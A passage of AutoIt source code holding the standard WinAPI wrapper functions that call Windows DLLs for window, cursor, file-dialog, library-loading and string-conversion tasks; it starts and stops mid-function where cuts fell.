	Local $aresult = DllCall("user32.dll", "int", "GetClassNameW", "hwnd", $hwnd, "wstr", "", "int", 4096)
	If @error OR NOT $aresult[0] Then Return SetError(@error, @extended, "")
	Return SetExtended($aresult[0], $aresult[2])
EndFunc

Func _winapi_getclientheight($hwnd)
	Local $trect = _winapi_getclientrect($hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return DllStructGetData($trect, "Bottom") - DllStructGetData($trect, "Top")
EndFunc

Func _winapi_getclientwidth($hwnd)
	Local $trect = _winapi_getclientrect($hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return DllStructGetData($trect, "Right") - DllStructGetData($trect, "Left")
EndFunc

Func _winapi_getclientrect($hwnd)
	Local $trect = DllStructCreate($tagrect)
	Local $aret = DllCall("user32.dll", "bool", "GetClientRect", "hwnd", $hwnd, "struct*", $trect)
	If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
	Return $trect
EndFunc

Func _winapi_getcurrentprocess()
	Local $aresult = DllCall("kernel32.dll", "handle", "GetCurrentProcess")
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getcurrentprocessid()
	Local $aresult = DllCall("kernel32.dll", "dword", "GetCurrentProcessId")
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getcurrentthread()
	Local $aresult = DllCall("kernel32.dll", "handle", "GetCurrentThread")
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getcurrentthreadid()
	Local $aresult = DllCall("kernel32.dll", "dword", "GetCurrentThreadId")
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getcursorinfo()
	Local $tcursor = DllStructCreate($tagcursorinfo)
	Local $icursor = DllStructGetSize($tcursor)
	DllStructSetData($tcursor, "Size", $icursor)
	Local $aret = DllCall("user32.dll", "bool", "GetCursorInfo", "struct*", $tcursor)
	If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
	Local $acursor[5]
	$acursor[0] = True
	$acursor[1] = DllStructGetData($tcursor, "Flags") <> 0
	$acursor[2] = DllStructGetData($tcursor, "hCursor")
	$acursor[3] = DllStructGetData($tcursor, "X")
	$acursor[4] = DllStructGetData($tcursor, "Y")
	Return $acursor
EndFunc

Func _winapi_getdc($hwnd)
	Local $aresult = DllCall("user32.dll", "handle", "GetDC", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getdesktopwindow()
	Local $aresult = DllCall("user32.dll", "hwnd", "GetDesktopWindow")
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getdevicecaps($hdc, $iindex)
	Local $aresult = DllCall("gdi32.dll", "int", "GetDeviceCaps", "handle", $hdc, "int", $iindex)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getdibits($hdc, $hbmp, $istartscan, $iscanlines, $pbits, $pbi, $iusage)
	Local $aresult = DllCall("gdi32.dll", "int", "GetDIBits", "handle", $hdc, "handle", $hbmp, "uint", $istartscan, "uint", $iscanlines, "ptr", $pbits, "ptr", $pbi, "uint", $iusage)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_getdlgctrlid($hwnd)
	Local $aresult = DllCall("user32.dll", "int", "GetDlgCtrlID", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getdlgitem($hwnd, $iitemid)
	Local $aresult = DllCall("user32.dll", "hwnd", "GetDlgItem", "hwnd", $hwnd, "int", $iitemid)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getfilesizeex($hfile)
	Local $aresult = DllCall("kernel32.dll", "bool", "GetFileSizeEx", "handle", $hfile, "int64*", 0)
	If @error OR NOT $aresult[0] Then Return SetError(@error, @extended, -1)
	Return $aresult[2]
EndFunc

Func _winapi_getfocus()
	Local $aresult = DllCall("user32.dll", "hwnd", "GetFocus")
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getforegroundwindow()
	Local $aresult = DllCall("user32.dll", "hwnd", "GetForegroundWindow")
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getguiresources($iflag = 0, $hprocess = -1)
	If $hprocess = -1 Then $hprocess = _winapi_getcurrentprocess()
	Local $aresult = DllCall("user32.dll", "dword", "GetGuiResources", "handle", $hprocess, "dword", $iflag)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_geticoninfo($hicon)
	Local $tinfo = DllStructCreate($tagiconinfo)
	Local $aret = DllCall("user32.dll", "bool", "GetIconInfo", "handle", $hicon, "struct*", $tinfo)
	If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
	Local $aicon[6]
	$aicon[0] = True
	$aicon[1] = DllStructGetData($tinfo, "Icon") <> 0
	$aicon[2] = DllStructGetData($tinfo, "XHotSpot")
	$aicon[3] = DllStructGetData($tinfo, "YHotSpot")
	$aicon[4] = DllStructGetData($tinfo, "hMask")
	$aicon[5] = DllStructGetData($tinfo, "hColor")
	Return $aicon
EndFunc

Func _winapi_getlasterrormessage()
	Local $ilasterror = _winapi_getlasterror()
	Local $tbufferptr = DllStructCreate("ptr")
	Local $ncount = _winapi_formatmessage(BitOR($format_message_allocate_buffer, $format_message_from_system), 0, $ilasterror, 0, $tbufferptr, 0, 0)
	If @error Then Return SetError(@error, 0, "")
	Local $stext = ""
	Local $pbuffer = DllStructGetData($tbufferptr, 1)
	If $pbuffer Then
		If $ncount > 0 Then
			Local $tbuffer = DllStructCreate("wchar[" & ($ncount + 1) & "]", $pbuffer)
			$stext = DllStructGetData($tbuffer, 1)
		EndIf
		_winapi_localfree($pbuffer)
	EndIf
	Return $stext
EndFunc

Func _winapi_getlayeredwindowattributes($hwnd, ByRef $itranscolor, ByRef $itransparency, $bcolorref = False)
	$itranscolor = -1
	$itransparency = -1
	Local $aresult = DllCall("user32.dll", "bool", "GetLayeredWindowAttributes", "hwnd", $hwnd, "INT*", $itranscolor, "byte*", $itransparency, "dword*", 0)
	If @error OR NOT $aresult[0] Then Return SetError(@error, @extended, 0)
	If NOT $bcolorref Then
		$aresult[2] = Int(BinaryMid($aresult[2], 3, 1) & BinaryMid($aresult[2], 2, 1) & BinaryMid($aresult[2], 1, 1))
	EndIf
	$itranscolor = $aresult[2]
	$itransparency = $aresult[3]
	Return $aresult[4]
EndFunc

Func _winapi_getmodulehandle($smodulename)
	Local $smodulenametype = "wstr"
	If $smodulename = "" Then
		$smodulename = 0
		$smodulenametype = "ptr"
	EndIf
	Local $aresult = DllCall("kernel32.dll", "handle", "GetModuleHandleW", $smodulenametype, $smodulename)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getmousepos($btoclient = False, $hwnd = 0)
	Local $imode = Opt("MouseCoordMode", 1)
	Local $apos = MouseGetPos()
	Opt("MouseCoordMode", $imode)
	Local $tpoint = DllStructCreate($tagpoint)
	DllStructSetData($tpoint, "X", $apos[0])
	DllStructSetData($tpoint, "Y", $apos[1])
	If $btoclient AND NOT _winapi_screentoclient($hwnd, $tpoint) Then Return SetError(@error + 20, @extended, 0)
	Return $tpoint
EndFunc

Func _winapi_getmouseposx($btoclient = False, $hwnd = 0)
	Local $tpoint = _winapi_getmousepos($btoclient, $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return DllStructGetData($tpoint, "X")
EndFunc

Func _winapi_getmouseposy($btoclient = False, $hwnd = 0)
	Local $tpoint = _winapi_getmousepos($btoclient, $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return DllStructGetData($tpoint, "Y")
EndFunc

Func _winapi_getobject($hobject, $isize, $pobject)
	Local $aresult = DllCall("gdi32.dll", "int", "GetObjectW", "handle", $hobject, "int", $isize, "ptr", $pobject)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getopenfilename($stitle = "", $sfilter = "All files (*.*)", $sinitaldir = ".", $sdefaultfile = "", $sdefaultext = "", $ifilterindex = 1, $iflags = 0, $iflagsex = 0, $hwndowner = 0)
	Local $ipathlen = 4096
	Local $inulls = 0
	Local $tofn = DllStructCreate($tagopenfilename)
	Local $afiles[1] = [0]
	Local $iflag = $iflags
	Local $asflines = StringSplit($sfilter, "|")
	Local $asfilter[$asflines[0] * 2 + 1]
	Local $istart, $ifinal, $tagfilter
	$asfilter[0] = $asflines[0] * 2
	For $i = 1 To $asflines[0]
		$istart = StringInStr($asflines[$i], "(", 0, 1)
		$ifinal = StringInStr($asflines[$i], ")", 0, -1)
		$asfilter[$i * 2 - 1] = StringStripWS(StringLeft($asflines[$i], $istart - 1), $str_stripleading + $str_striptrailing)
		$asfilter[$i * 2] = StringStripWS(StringTrimRight(StringTrimLeft($asflines[$i], $istart), StringLen($asflines[$i]) - $ifinal + 1), $str_stripleading + $str_striptrailing)
		$tagfilter &= "wchar[" & StringLen($asfilter[$i * 2 - 1]) + 1 & "];wchar[" & StringLen($asfilter[$i * 2]) + 1 & "];"
	Next
	Local $ttitle = DllStructCreate("wchar Title[" & StringLen($stitle) + 1 & "]")
	Local $tinitialdir = DllStructCreate("wchar InitDir[" & StringLen($sinitaldir) + 1 & "]")
	Local $tfilter = DllStructCreate($tagfilter & "wchar")
	Local $tpath = DllStructCreate("wchar Path[" & $ipathlen & "]")
	Local $textn = DllStructCreate("wchar Extension[" & StringLen($sdefaultext) + 1 & "]")
	For $i = 1 To $asfilter[0]
		DllStructSetData($tfilter, $i, $asfilter[$i])
	Next
	DllStructSetData($ttitle, "Title", $stitle)
	DllStructSetData($tinitialdir, "InitDir", $sinitaldir)
	DllStructSetData($tpath, "Path", $sdefaultfile)
	DllStructSetData($textn, "Extension", $sdefaultext)
	DllStructSetData($tofn, "StructSize", DllStructGetSize($tofn))
	DllStructSetData($tofn, "hwndOwner", $hwndowner)
	DllStructSetData($tofn, "lpstrFilter", DllStructGetPtr($tfilter))
	DllStructSetData($tofn, "nFilterIndex", $ifilterindex)
	DllStructSetData($tofn, "lpstrFile", DllStructGetPtr($tpath))
	DllStructSetData($tofn, "nMaxFile", $ipathlen)
	DllStructSetData($tofn, "lpstrInitialDir", DllStructGetPtr($tinitialdir))
	DllStructSetData($tofn, "lpstrTitle", DllStructGetPtr($ttitle))
	DllStructSetData($tofn, "Flags", $iflag)
	DllStructSetData($tofn, "lpstrDefExt", DllStructGetPtr($textn))
	DllStructSetData($tofn, "FlagsEx", $iflagsex)
	Local $ares = DllCall("comdlg32.dll", "bool", "GetOpenFileNameW", "struct*", $tofn)
	If @error OR NOT $ares[0] Then Return SetError(@error + 10, @extended, $afiles)
	If BitAND($iflags, $ofn_allowmultiselect) = $ofn_allowmultiselect AND BitAND($iflags, $ofn_explorer) = $ofn_explorer Then
		For $x = 1 To $ipathlen
			If DllStructGetData($tpath, "Path", $x) = Chr(0) Then
				DllStructSetData($tpath, "Path", "|", $x)
				$inulls += 1
			Else
				$inulls = 0
			EndIf
			If $inulls = 2 Then ExitLoop
		Next
		DllStructSetData($tpath, "Path", Chr(0), $x - 1)
		$afiles = StringSplit(DllStructGetData($tpath, "Path"), "|")
		If $afiles[0] = 1 Then Return __winapi_parsefiledialogpath(DllStructGetData($tpath, "Path"))
		Return StringSplit(DllStructGetData($tpath, "Path"), "|")
	ElseIf BitAND($iflags, $ofn_allowmultiselect) = $ofn_allowmultiselect Then
		$afiles = StringSplit(DllStructGetData($tpath, "Path"), " ")
		If $afiles[0] = 1 Then Return __winapi_parsefiledialogpath(DllStructGetData($tpath, "Path"))
		Return StringSplit(StringReplace(DllStructGetData($tpath, "Path"), " ", "|"), "|")
	Else
		Return __winapi_parsefiledialogpath(DllStructGetData($tpath, "Path"))
	EndIf
EndFunc

Func _winapi_getoverlappedresult($hfile, $poverlapped, ByRef $ibytes, $bwait = False)
	Local $aresult = DllCall("kernel32.dll", "bool", "GetOverlappedResult", "handle", $hfile, "ptr", $poverlapped, "dword*", 0, "bool", $bwait)
	If @error OR NOT $aresult[0] Then Return SetError(@error, @extended, False)
	$ibytes = $aresult[3]
	Return $aresult[0]
EndFunc

Func _winapi_getparent($hwnd)
	Local $aresult = DllCall("user32.dll", "hwnd", "GetParent", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getprocaddress($hmodule, $vname)
	Local $stype = "str"
	If IsNumber($vname) Then $stype = "word"
	Local $aresult = DllCall("kernel32.dll", "ptr", "GetProcAddress", "handle", $hmodule, $stype, $vname)
	If @error OR NOT $aresult[0] Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getprocessaffinitymask($hprocess)
	Local $aresult = DllCall("kernel32.dll", "bool", "GetProcessAffinityMask", "handle", $hprocess, "dword_ptr*", 0, "dword_ptr*", 0)
	If @error OR NOT $aresult[0] Then Return SetError(@error + 10, @extended, 0)
	Local $amask[3]
	$amask[0] = True
	$amask[1] = $aresult[2]
	$amask[2] = $aresult[3]
	Return $amask
EndFunc

Func _winapi_getsavefilename($stitle = "", $sfilter = "All files (*.*)", $sinitaldir = ".", $sdefaultfile = "", $sdefaultext = "", $ifilterindex = 1, $iflags = 0, $iflagsex = 0, $hwndowner = 0)
	Local $ipathlen = 4096
	Local $tofn = DllStructCreate($tagopenfilename)
	Local $afiles[1] = [0]
	Local $iflag = $iflags
	Local $asflines = StringSplit($sfilter, "|")
	Local $asfilter[$asflines[0] * 2 + 1]
	Local $istart, $ifinal, $tagfilter
	$asfilter[0] = $asflines[0] * 2
	For $i = 1 To $asflines[0]
		$istart = StringInStr($asflines[$i], "(", 0, 1)
		$ifinal = StringInStr($asflines[$i], ")", 0, -1)
		$asfilter[$i * 2 - 1] = StringStripWS(StringLeft($asflines[$i], $istart - 1), $str_stripleading + $str_striptrailing)
		$asfilter[$i * 2] = StringStripWS(StringTrimRight(StringTrimLeft($asflines[$i], $istart), StringLen($asflines[$i]) - $ifinal + 1), $str_stripleading + $str_striptrailing)
		$tagfilter &= "wchar[" & StringLen($asfilter[$i * 2 - 1]) + 1 & "];wchar[" & StringLen($asfilter[$i * 2]) + 1 & "];"
	Next
	Local $ttitle = DllStructCreate("wchar Title[" & StringLen($stitle) + 1 & "]")
	Local $tinitialdir = DllStructCreate("wchar InitDir[" & StringLen($sinitaldir) + 1 & "]")
	Local $tfilter = DllStructCreate($tagfilter & "wchar")
	Local $tpath = DllStructCreate("wchar Path[" & $ipathlen & "]")
	Local $textn = DllStructCreate("wchar Extension[" & StringLen($sdefaultext) + 1 & "]")
	For $i = 1 To $asfilter[0]
		DllStructSetData($tfilter, $i, $asfilter[$i])
	Next
	DllStructSetData($ttitle, "Title", $stitle)
	DllStructSetData($tinitialdir, "InitDir", $sinitaldir)
	DllStructSetData($tpath, "Path", $sdefaultfile)
	DllStructSetData($textn, "Extension", $sdefaultext)
	DllStructSetData($tofn, "StructSize", DllStructGetSize($tofn))
	DllStructSetData($tofn, "hwndOwner", $hwndowner)
	DllStructSetData($tofn, "lpstrFilter", DllStructGetPtr($tfilter))
	DllStructSetData($tofn, "nFilterIndex", $ifilterindex)
	DllStructSetData($tofn, "lpstrFile", DllStructGetPtr($tpath))
	DllStructSetData($tofn, "nMaxFile", $ipathlen)
	DllStructSetData($tofn, "lpstrInitialDir", DllStructGetPtr($tinitialdir))
	DllStructSetData($tofn, "lpstrTitle", DllStructGetPtr($ttitle))
	DllStructSetData($tofn, "Flags", $iflag)
	DllStructSetData($tofn, "lpstrDefExt", DllStructGetPtr($textn))
	DllStructSetData($tofn, "FlagsEx", $iflagsex)
	Local $ares = DllCall("comdlg32.dll", "bool", "GetSaveFileNameW", "struct*", $tofn)
	If @error OR NOT $ares[0] Then Return SetError(@error + 10, @extended, $afiles)
	Return __winapi_parsefiledialogpath(DllStructGetData($tpath, "Path"))
EndFunc

Func _winapi_getstockobject($iobject)
	Local $aresult = DllCall("gdi32.dll", "handle", "GetStockObject", "int", $iobject)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getstdhandle($istdhandle)
	If $istdhandle < 0 OR $istdhandle > 2 Then Return SetError(2, 0, -1)
	Local Const $ahandle[3] = [-10, -11, -12]
	Local $aresult = DllCall("kernel32.dll", "handle", "GetStdHandle", "dword", $ahandle[$istdhandle])
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc

Func _winapi_getsyscolor($iindex)
	Local $aresult = DllCall("user32.dll", "INT", "GetSysColor", "int", $iindex)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getsyscolorbrush($iindex)
	Local $aresult = DllCall("user32.dll", "handle", "GetSysColorBrush", "int", $iindex)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getsystemmetrics($iindex)
	Local $aresult = DllCall("user32.dll", "int", "GetSystemMetrics", "int", $iindex)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_gettextextentpoint32($hdc, $stext)
	Local $tsize = DllStructCreate($tagsize)
	Local $isize = StringLen($stext)
	Local $aret = DllCall("gdi32.dll", "bool", "GetTextExtentPoint32W", "handle", $hdc, "wstr", $stext, "int", $isize, "struct*", $tsize)
	If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
	Return $tsize
EndFunc

Func _winapi_gettextmetrics($hdc)
	Local $ttextmetric = DllStructCreate($tagtextmetric)
	Local $aret = DllCall("gdi32.dll", "bool", "GetTextMetricsW", "handle", $hdc, "struct*", $ttextmetric)
	If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
	Return $ttextmetric
EndFunc

Func _winapi_getwindow($hwnd, $icmd)
	Local $aresult = DllCall("user32.dll", "hwnd", "GetWindow", "hwnd", $hwnd, "uint", $icmd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getwindowdc($hwnd)
	Local $aresult = DllCall("user32.dll", "handle", "GetWindowDC", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getwindowheight($hwnd)
	Local $trect = _winapi_getwindowrect($hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return DllStructGetData($trect, "Bottom") - DllStructGetData($trect, "Top")
EndFunc

Func _winapi_getwindowlong($hwnd, $iindex)
	Local $sfuncname = "GetWindowLongW"
	If @AutoItX64 Then $sfuncname = "GetWindowLongPtrW"
	Local $aresult = DllCall("user32.dll", "long_ptr", $sfuncname, "hwnd", $hwnd, "int", $iindex)
	If @error OR NOT $aresult[0] Then Return SetError(@error + 10, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getwindowplacement($hwnd)
	Local $twindowplacement = DllStructCreate($tagwindowplacement)
	DllStructSetData($twindowplacement, "length", DllStructGetSize($twindowplacement))
	Local $aret = DllCall("user32.dll", "bool", "GetWindowPlacement", "hwnd", $hwnd, "struct*", $twindowplacement)
	If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
	Return $twindowplacement
EndFunc

Func _winapi_getwindowrect($hwnd)
	Local $trect = DllStructCreate($tagrect)
	Local $aret = DllCall("user32.dll", "bool", "GetWindowRect", "hwnd", $hwnd, "struct*", $trect)
	If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
	Return $trect
EndFunc

Func _winapi_getwindowrgn($hwnd, $hrgn)
	Local $aresult = DllCall("user32.dll", "int", "GetWindowRgn", "hwnd", $hwnd, "handle", $hrgn)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getwindowtext($hwnd)
	Local $aresult = DllCall("user32.dll", "int", "GetWindowTextW", "hwnd", $hwnd, "wstr", "", "int", 4096)
	If @error OR NOT $aresult[0] Then Return SetError(@error + 10, @extended, "")
	Return SetExtended($aresult[0], $aresult[2])
EndFunc

Func _winapi_getwindowthreadprocessid($hwnd, ByRef $ipid)
	Local $aresult = DllCall("user32.dll", "dword", "GetWindowThreadProcessId", "hwnd", $hwnd, "dword*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	$ipid = $aresult[2]
	Return $aresult[0]
EndFunc

Func _winapi_getwindowwidth($hwnd)
	Local $trect = _winapi_getwindowrect($hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return DllStructGetData($trect, "Right") - DllStructGetData($trect, "Left")
EndFunc

Func _winapi_getxyfrompoint(ByRef $tpoint, ByRef $ix, ByRef $iy)
	$ix = DllStructGetData($tpoint, "X")
	$iy = DllStructGetData($tpoint, "Y")
EndFunc

Func _winapi_globalmemorystatus()
	Local $tmem = DllStructCreate($tagmemorystatusex)
	DllStructSetData($tmem, 1, DllStructGetSize($tmem))
	Local $aret = DllCall("kernel32.dll", "bool", "GlobalMemoryStatusEx", "struct*", $tmem)
	If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
	Local $amem[7]
	$amem[0] = DllStructGetData($tmem, 2)
	$amem[1] = DllStructGetData($tmem, 3)
	$amem[2] = DllStructGetData($tmem, 4)
	$amem[3] = DllStructGetData($tmem, 5)
	$amem[4] = DllStructGetData($tmem, 6)
	$amem[5] = DllStructGetData($tmem, 7)
	$amem[6] = DllStructGetData($tmem, 8)
	Return $amem
EndFunc

Func _winapi_guidfromstring($sguid)
	Local $tguid = DllStructCreate($tagguid)
	_winapi_guidfromstringex($sguid, $tguid)
	If @error Then Return SetError(@error + 10, @extended, 0)
	Return $tguid
EndFunc

Func _winapi_guidfromstringex($sguid, $pguid)
	Local $aresult = DllCall("ole32.dll", "long", "CLSIDFromString", "wstr", $sguid, "struct*", $pguid)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_hiword($ilong)
	Return BitShift($ilong, 16)
EndFunc

Func _winapi_inprocess($hwnd, ByRef $hlastwnd)
	If $hwnd = $hlastwnd Then Return True
	For $ii = $__g_ainprocess_winapi[0][0] To 1 Step -1
		If $hwnd = $__g_ainprocess_winapi[$ii][0] Then
			If $__g_ainprocess_winapi[$ii][1] Then
				$hlastwnd = $hwnd
				Return True
			Else
				Return False
			EndIf
		EndIf
	Next
	Local $ipid
	_winapi_getwindowthreadprocessid($hwnd, $ipid)
	Local $icount = $__g_ainprocess_winapi[0][0] + 1
	If $icount >= 64 Then $icount = 1
	$__g_ainprocess_winapi[0][0] = $icount
	$__g_ainprocess_winapi[$icount][0] = $hwnd
	$__g_ainprocess_winapi[$icount][1] = ($ipid = @AutoItPID)
	Return $__g_ainprocess_winapi[$icount][1]
EndFunc

Func _winapi_inttofloat($iint)
	Local $tint = DllStructCreate("int")
	Local $tfloat = DllStructCreate("float", DllStructGetPtr($tint))
	DllStructSetData($tint, 1, $iint)
	Return DllStructGetData($tfloat, 1)
EndFunc

Func _winapi_isclassname($hwnd, $sclassname)
	Local $sseparator = Opt("GUIDataSeparatorChar")
	Local $aclassname = StringSplit($sclassname, $sseparator)
	If NOT IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
	Local $sclasscheck = _winapi_getclassname($hwnd)
	For $x = 1 To UBound($aclassname) - 1
		If StringUpper(StringMid($sclasscheck, 1, StringLen($aclassname[$x]))) = StringUpper($aclassname[$x]) Then Return True
	Next
	Return False
EndFunc

Func _winapi_iswindow($hwnd)
	Local $aresult = DllCall("user32.dll", "bool", "IsWindow", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_iswindowvisible($hwnd)
	Local $aresult = DllCall("user32.dll", "bool", "IsWindowVisible", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_invalidaterect($hwnd, $trect = 0, $berase = True)
	Local $aresult = DllCall("user32.dll", "bool", "InvalidateRect", "hwnd", $hwnd, "struct*", $trect, "bool", $berase)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_lineto($hdc, $ix, $iy)
	Local $aresult = DllCall("gdi32.dll", "bool", "LineTo", "handle", $hdc, "int", $ix, "int", $iy)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_loadbitmap($hinstance, $sbitmap)
	Local $sbitmaptype = "int"
	If IsString($sbitmap) Then $sbitmaptype = "wstr"
	Local $aresult = DllCall("user32.dll", "handle", "LoadBitmapW", "handle", $hinstance, $sbitmaptype, $sbitmap)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_loadimage($hinstance, $simage, $itype, $ixdesired, $iydesired, $iload)
	Local $aresult, $simagetype = "int"
	If IsString($simage) Then $simagetype = "wstr"
	$aresult = DllCall("user32.dll", "handle", "LoadImageW", "handle", $hinstance, $simagetype, $simage, "uint", $itype, "int", $ixdesired, "int", $iydesired, "uint", $iload)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_loadlibrary($sfilename)
	Local $aresult = DllCall("kernel32.dll", "handle", "LoadLibraryW", "wstr", $sfilename)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_loadlibraryex($sfilename, $iflags = 0)
	Local $aresult = DllCall("kernel32.dll", "handle", "LoadLibraryExW", "wstr", $sfilename, "ptr", 0, "dword", $iflags)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_loadshell32icon($iiconid)
	Local $ticons = DllStructCreate("ptr Data")
	Local $iicons = _winapi_extracticonex("shell32.dll", $iiconid, 0, $ticons, 1)
	If @error Then Return SetError(@error, @extended, 0)
	If $iicons <= 0 Then Return SetError(10, 0, 0)
	Return DllStructGetData($ticons, "Data")
EndFunc

Func _winapi_loadstring($hinstance, $istringid)
	Local $aresult = DllCall("user32.dll", "int", "LoadStringW", "handle", $hinstance, "uint", $istringid, "wstr", "", "int", 4096)
	If @error OR NOT $aresult[0] Then Return SetError(@error + 10, @extended, "")
	Return SetExtended($aresult[0], $aresult[3])
EndFunc

Func _winapi_localfree($hmem)
	Local $aresult = DllCall("kernel32.dll", "handle", "LocalFree", "handle", $hmem)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_loword($ilong)
	Return BitAND($ilong, 65535)
EndFunc

Func _winapi_makelangid($iprimary, $isub)
	Return BitOR(BitShift($isub, -10), $iprimary)
EndFunc

Func _winapi_makelcid($ilgid, $isrtid)
	Return BitOR(BitShift($isrtid, -16), $ilgid)
EndFunc

Func _winapi_makelong($ilo, $ihi)
	Return BitOR(BitShift($ihi, -16), BitAND($ilo, 65535))
EndFunc

Func _winapi_makeqword($ilodword, $ihidword)
	Local $tint64 = DllStructCreate("uint64")
	Local $tdwords = DllStructCreate("dword;dword", DllStructGetPtr($tint64))
	DllStructSetData($tdwords, 1, $ilodword)
	DllStructSetData($tdwords, 2, $ihidword)
	Return DllStructGetData($tint64, 1)
EndFunc

Func _winapi_messagebeep($itype = 1)
	Local $isound
	Switch $itype
		Case 1
			$isound = 0
		Case 2
			$isound = 16
		Case 3
			$isound = 32
		Case 4
			$isound = 48
		Case 5
			$isound = 64
		Case Else
			$isound = -1
	EndSwitch
	Local $aresult = DllCall("user32.dll", "bool", "MessageBeep", "uint", $isound)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_msgbox($iflags, $stitle, $stext)
	BlockInput(0)
	MsgBox($iflags, $stitle, $stext & "      ")
EndFunc

Func _winapi_mouse_event($iflags, $ix = 0, $iy = 0, $idata = 0, $iextrainfo = 0)
	DllCall("user32.dll", "none", "mouse_event", "dword", $iflags, "dword", $ix, "dword", $iy, "dword", $idata, "ulong_ptr", $iextrainfo)
	If @error Then Return SetError(@error, @extended)
EndFunc

Func _winapi_moveto($hdc, $ix, $iy)
	Local $aresult = DllCall("gdi32.dll", "bool", "MoveToEx", "handle", $hdc, "int", $ix, "int", $iy, "ptr", 0)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_movewindow($hwnd, $ix, $iy, $iwidth, $iheight, $brepaint = True)
	Local $aresult = DllCall("user32.dll", "bool", "MoveWindow", "hwnd", $hwnd, "int", $ix, "int", $iy, "int", $iwidth, "int", $iheight, "bool", $brepaint)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_muldiv($inumber, $inumerator, $idenominator)
	Local $aresult = DllCall("kernel32.dll", "int", "MulDiv", "int", $inumber, "int", $inumerator, "int", $idenominator)
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc

Func _winapi_multibytetowidechar($stext, $icodepage = 0, $iflags = 0, $bretstring = False)
	Local $stexttype = "str"
	If NOT IsString($stext) Then $stexttype = "struct*"
	Local $aresult = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, $stexttype, $stext, "int", -1, "ptr", 0, "int", 0)
	If @error OR NOT $aresult[0] Then Return SetError(@error + 10, @extended, 0)
	Local $iout = $aresult[0]
	Local $tout = DllStructCreate("wchar[" & $iout & "]")
	$aresult = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, $stexttype, $stext, "int", -1, "struct*", $tout, "int", $iout)
